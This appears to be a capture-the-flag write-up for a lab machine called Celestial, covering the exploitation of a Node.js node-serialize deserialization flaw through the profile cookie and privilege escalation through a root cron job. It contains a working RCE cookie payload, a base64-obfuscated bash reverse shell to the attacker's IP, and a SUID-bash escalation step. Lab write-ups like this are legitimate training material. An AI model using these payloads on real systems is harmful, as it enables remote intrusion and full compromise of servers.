---
layout: default
---

# Celestial

# Skills

# Enumeration

IP → 10.10.10.85

Port scan

```bash
PORT     STATE SERVICE REASON  VERSION
3000/tcp open  http    syn-ack Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Port 3000

### Headers and Tech

```bash
┌──(kali㉿kali)-[~/machines/linux/celestial/enumeration]
└─$ curl -I http://10.10.10.85:3000
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Sat, 02 Dec 2023 10:49:07 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 12
ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
Date: Sat, 02 Dec 2023 10:34:07 GMT
Connection: keep-alive

┌──(kali㉿kali)-[~/machines/linux/celestial/enumeration]
└─$ whatweb 10.10.10.85:3000                                                                 
http://10.10.10.85:3000 [200 OK] Cookies[profile], Country[RESERVED][ZZ], HttpOnly[profile], IP[10.10.10.85], X-Powered-By[Express]
```

- Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Sat, 02 Dec 2023 10:49:07 GMT; HttpOnly

### Fuzzing

Nothing

### Enumeration

The cookie value decoded is:

- `{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}`

Two possible attacks

- SSTI
- Node deserialization attack

When sending an incorrect payload we obtain an error.

```bash
SyntaxError: Unexpected token :
    at Object.parse (native)
    at Object.exports.unserialize (/home/sun/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/sun/server.js:11:24
    at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/sun/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
    at /home/sun/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)
    at next (/home/sun/node_modules/express/lib/router/index.js:275:10)
```

# Foothold

From the error we can see that there is a deserialization process. To exploit this we can use the following script in JS.

```bash
let f = {rce: function() {require('child_process').exec('ping -c 1 10.10.14.5', function(error, stdout, stderr) { console.log(stdout); });},};

let y = {"username":f,"country":f,"city":f,"num":1};
  
let serialize = require('node-serialize');
console.log("Serialized: \n" + Buffer.from(serialize.serialize(y)).toString('base64'));

console.log(serialize.serialize(y))
```

In this blog we can see how this actually exploted [https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

When we execute this we will obtain the cookie and the cookie in base64. We need the cookie in plain text and we will add `()` at the end of it to immediately execute the function once is deserialized.

- `{"username":{"rce":"*$$ND_FUNC$$function() {require('child_process').exec('ping -c 1 10.10.14.5', function(error, stdout, stderr) { console.log(stdout); });} ()"},"country":"$$ND_CC$$*$*$$.$$username","city":"$$ND_CC$$*$_$$.$$_username","num":1}`

If we pass this as the cookie we will receive a ping.

```bash
┌──(kali㉿kali)-[~/machines/linux/celestial]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:29:36.147278 IP 10.10.10.85 > 10.10.14.5: ICMP echo request, id 7446, seq 1, length 64
12:29:36.147470 IP 10.10.14.5 > 10.10.10.85: ICMP echo reply, id 7446, seq 1, length 64
12:34:25.692854 IP 10.10.10.85 > 10.10.14.5: ICMP echo request, id 7463, seq 1, length 64
12:34:25.692885 IP 10.10.14.5 > 10.10.10.85: ICMP echo reply, id 7463, seq 1, length 64
```

To obtain a shell I will use the following payload.

- `echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0MyAwPiYxIgo= | base64 -d | bash`

And we obtain a shell in the listener.

```bash
sun@celestial:~$ id
uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

# Privilege escalation

If we launch linpeas we will see that the system may be vulnerable to a kernel exploit, but it don’t actually work.

If check the user home directory we will see in Documents a `script.py` . Launching pspy an waiting 5 minutes we will see that there is a cronjob running.

```bash
2023/12/02 07:07:02 CMD: UID=0     PID=1      | /sbin/init splash 
2023/12/02 07:08:01 CMD: UID=1000  PID=26622  | nodejs /home/sun/server.js 
2023/12/02 07:08:01 CMD: UID=1000  PID=26621  | /bin/sh -c nodejs /home/sun/server.js >/dev/null 2>&1 
2023/12/02 07:08:01 CMD: UID=0     PID=26620  | /usr/sbin/CRON -f 
2023/12/02 07:09:01 CMD: UID=1000  PID=26631  | nodejs /home/sun/server.js 
2023/12/02 07:09:01 CMD: UID=1000  PID=26630  | /bin/sh -c nodejs /home/sun/server.js >/dev/null 2>&1 
2023/12/02 07:09:01 CMD: UID=0     PID=26629  | /usr/sbin/CRON -f 
2023/12/02 07:10:01 CMD: UID=0     PID=26642  | python /home/sun/Documents/script.py 
2023/12/02 07:10:01 CMD: UID=0     PID=26641  | /usr/sbin/CRON -f 
2023/12/02 07:10:01 CMD: UID=0     PID=26640  | /bin/sh -c python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py                                                                                                                                     
2023/12/02 07:10:01 CMD: UID=0     PID=26639  | /usr/sbin/CRON -f 
2023/12/02 07:10:01 CMD: UID=0     PID=26638  | /usr/sbin/CRON -f 
2023/12/02 07:10:01 CMD: UID=1000  PID=26643  | nodejs /home/sun/server.js 
2023/12/02 07:10:01 CMD: UID=0     PID=26648  | python /home/sun/Documents/script.py
```

Root execute that script so we simply has to change it to set the bash with the SUID bit and wait another 5 minutes.

```bash
sun@celestial:~$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
sun@celestial:~$ bash -p
bash-4.3# whoami
root
```